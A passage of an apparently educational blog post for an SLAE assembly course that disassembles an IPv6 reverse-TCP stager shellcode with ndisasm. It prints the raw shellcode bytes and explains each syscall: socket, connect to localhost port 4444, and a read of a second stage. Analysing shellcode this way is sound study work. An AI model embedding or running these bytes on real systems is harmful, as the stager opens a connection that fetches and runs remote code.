+</code></pre></div> <h4 id="ndisasm-disassembly">ndisasm Disassembly</h4> <p>ndisasm can be used to disassemble the shellcode into meaningful assembly instructions.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">libemu</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">sctest</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96\x99\x68\x00\x00\x00\x00\x68\x00\x00\x00\x01\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x52\x66\x68\x11\x5c\x66\x68\x0a\x00\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x89\xf3\xb6\x0c\xb0\x03\xcd\x80\x89\xdf</span><span class="s">"</span> <span class="o">|</span> <span class="n">ndisasm</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span>
+<span class="mi">00000000</span>  <span class="mi">31</span><span class="kt">DB</span>              <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
+<span class="mi">00000002</span>  <span class="mi">53</span>                <span class="k">push</span> <span class="n">ebx</span>
+<span class="mi">00000003</span>  <span class="mi">43</span>                <span class="k">inc</span> <span class="n">ebx</span>
+<span class="mi">00000004</span>  <span class="mi">53</span>                <span class="k">push</span> <span class="n">ebx</span>
+<span class="mi">00000005</span>  <span class="mi">6</span><span class="n">A0A</span>              <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0xa</span>
+<span class="mi">00000007</span>  <span class="mi">89</span><span class="n">E1</span>              <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+<span class="mi">00000009</span>  <span class="mi">6</span><span class="n">A66</span>              <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>
+<span class="mi">0000000</span><span class="n">B</span>  <span class="mi">58</span>                <span class="k">pop</span> <span class="n">eax</span>
+<span class="mi">0000000</span><span class="n">C</span>  <span class="n">CD80</span>              <span class="k">int</span> <span class="mh">0x80</span>
+<span class="mi">0000000</span><span class="n">E</span>  <span class="mi">96</span>                <span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span><span class="n">esi</span>
+<span class="mi">0000000</span><span class="n">F</span>  <span class="mi">99</span>                <span class="k">cdq</span>
+<span class="mi">00000010</span>  <span class="mi">6800000000</span>        <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>
+<span class="mi">00000015</span>  <span class="mi">6800000001</span>        <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x1000000</span>
+<span class="mi">0000001</span><span class="n">A</span>  <span class="mi">6800000000</span>        <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>
+<span class="mi">0000001</span><span class="n">F</span>  <span class="mi">6800000000</span>        <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>
+<span class="mi">00000024</span>  <span class="mi">6800000000</span>        <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>
+<span class="mi">00000029</span>  <span class="mi">52</span>                <span class="k">push</span> <span class="n">edx</span>
+<span class="mi">0000002</span><span class="n">A</span>  <span class="mi">6668115</span><span class="n">C</span>          <span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span>
+<span class="mi">0000002</span><span class="n">E</span>  <span class="mi">66680</span><span class="n">A00</span>          <span class="k">push</span> <span class="n">word</span> <span class="mh">0xa</span>
+<span class="mi">00000032</span>  <span class="mi">89</span><span class="n">E1</span>              <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+<span class="mi">00000034</span>  <span class="mi">6</span><span class="n">A1C</span>              <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x1c</span>
+<span class="mi">00000036</span>  <span class="mi">51</span>                <span class="k">push</span> <span class="n">ecx</span>
+<span class="mi">00000037</span>  <span class="mi">56</span>                <span class="k">push</span> <span class="n">esi</span>
+<span class="mi">00000038</span>  <span class="mi">89</span><span class="n">E1</span>              <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+<span class="mi">0000003</span><span class="n">A</span>  <span class="mi">43</span>                <span class="k">inc</span> <span class="n">ebx</span>
+<span class="mi">0000003</span><span class="n">B</span>  <span class="mi">43</span>                <span class="k">inc</span> <span class="n">ebx</span>
+<span class="mi">0000003</span><span class="n">C</span>  <span class="mi">6</span><span class="n">A66</span>              <span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>
+<span class="mi">0000003</span><span class="n">E</span>  <span class="mi">58</span>                <span class="k">pop</span> <span class="n">eax</span>
+<span class="mi">0000003</span><span class="n">F</span>  <span class="n">CD80</span>              <span class="k">int</span> <span class="mh">0x80</span>
+<span class="mi">00000041</span>  <span class="mi">89</span><span class="n">F3</span>              <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esi</span>
+<span class="mi">00000043</span>  <span class="n">B60C</span>              <span class="k">mov</span> <span class="n">dh</span><span class="p">,</span><span class="mh">0xc</span>
+<span class="mi">00000045</span>  <span class="n">B003</span>              <span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x3</span>
+<span class="mi">00000047</span>  <span class="n">CD80</span>              <span class="k">int</span> <span class="mh">0x80</span>
+<span class="mi">00000049</span>  <span class="mi">89</span><span class="n">DF</span>              <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">ebx</span>
+<span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">libemu</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">sctest</span><span class="err">$</span>
+</code></pre></div> <p>Looking at the disassembly above, there are three system call interrupts.</p> <h4 id="interrupt-1---socket-creation">Interrupt 1 - Socket Creation</h4> <p>The first chunk of instructions are responsible for creating a IPv6 socket.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>     <span class="c">;clear out ebx</span>
+<span class="k">push</span> <span class="n">ebx</span>        <span class="c">;socket protocol 0x0 is moved on to the stack</span>
+<span class="k">inc</span> <span class="n">ebx</span>         <span class="c">;socketcall type, socket</span>
+<span class="k">push</span> <span class="n">ebx</span>        <span class="c">;socket type 1, SOCK_STREAM, is moved on to the stack</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0xa</span>  <span class="c">;push socket type 10 (INET6) on to the stack</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>     <span class="c">;all arguments for socket, as required by socketcall are pointed to by ECX</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span> <span class="c">;push 102 onto the stack (socketcall)</span>
+<span class="k">pop</span> <span class="n">eax</span>         <span class="c">;socketcall syscall</span>
+<span class="k">int</span> <span class="mh">0x80</span>        <span class="c">;execute socketcall</span>
+</code></pre></div> <h4 id="interrupt-2---connect">Interrupt 2 - Connect</h4> <p>The second chunk of instructions are responsible for creating an IPv6 connect structure.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span><span class="n">esi</span>          <span class="c">;place socket file descriptor into ESI. Also clear out EAX.</span>
+<span class="k">cdq</span>
+
+<span class="c">;populate the stack with the arguments for the sockaddr_in structure</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>        <span class="c">;ipv6 localhost pushed on to the stack</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x1000000</span>  <span class="c">;ipv6 localhost pushed on to the stack</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>        <span class="c">;ipv6 localhost pushed on to the stack</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>        <span class="c">;ipv6 localhost pushed on to the stack</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x0</span>        <span class="c">;ipv6 localhost pushed on to the stack</span>
+<span class="k">push</span> <span class="n">edx</span>
+<span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span>      <span class="c">;sin_port 4444 pushed on to the stack</span>
+<span class="k">push</span> <span class="n">word</span> <span class="mh">0xa</span>         <span class="c">;sin_family, INET6, which is 10 pushed on to the stack</span>
+
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">;the stack pointer to the sockaddr_in structure is moved into ecx</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x1c</span>       <span class="c">;push connect addrlen to the stack, the length of the struct</span>
+<span class="k">push</span> <span class="n">ecx</span>              <span class="c">;the stack pointer to the sockaddr_in structure pushed on to the stack</span>
+<span class="k">push</span> <span class="n">esi</span>              <span class="k">push</span> <span class="n">connect</span> <span class="n">sockfd</span> <span class="n">to</span> <span class="n">the</span> <span class="n">stack</span><span class="p">,</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">value</span> <span class="n">of</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="n">returned</span> <span class="n">to</span> <span class="n">socket</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">;update ecx to the stack pointer which currently contains a pointer to "sockfd, sockaddr_in, addrlen". All arguments for connect, as required by socketcall are pointed to by ECX</span>
+<span class="k">inc</span> <span class="n">ebx</span>               <span class="c">;ebx now contains 2</span>
+<span class="k">inc</span> <span class="n">ebx</span>               <span class="c">;ebx now contains 3, for the type of socketcall, which is connect</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>       <span class="c">;push 102 onto the stack (socketcall)</span>
+<span class="k">pop</span> <span class="n">eax</span>               <span class="c">;socketcall syscall</span>
+<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">;execute connect</span>
+</code></pre></div> <h4 id="interrupt-3---read">Interrupt 3 - Read</h4> <p>The last chunk of instructions are responsible for creating the read system call.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esi</span>         <span class="c">;move the socket file descriptor into EBX</span>
+<span class="k">mov</span> <span class="n">dh</span><span class="p">,</span><span class="mh">0xc</span>          
+<span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x3</span>          <span class="c">;read syscall</span>
+<span class="k">int</span> <span class="mh">0x80</span>            <span class="c">;execute read</span>
+</code></pre></div> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#msfvenom" title="Pages tagged msfvenom" class="tag"><span class="term">msfvenom</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-5/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-5/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-5/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
